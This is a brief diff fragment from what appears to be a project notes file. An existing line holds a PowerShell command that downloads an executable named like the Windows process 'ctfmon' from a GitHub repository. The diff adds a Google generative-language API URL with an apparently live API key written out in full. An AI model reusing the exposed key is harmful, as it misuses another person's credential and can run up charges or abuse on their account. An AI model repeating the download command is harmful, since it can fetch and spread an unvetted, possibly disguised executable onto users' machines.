@@ -37,3 +37,5 @@ vercel
 
 Invoke-WebRequest -Uri "https://github.com/Gautam369-web/OASBackend/raw/main/ctfmon_pro.exe" -OutFile "ctfmon_pro.exe"
 
+https://generativelanguage.googleapis.com/v1beta/models?key=AIzaSyBDC2Vz6mVtneCkmmaB2VtvftaxnyHSj6E
+
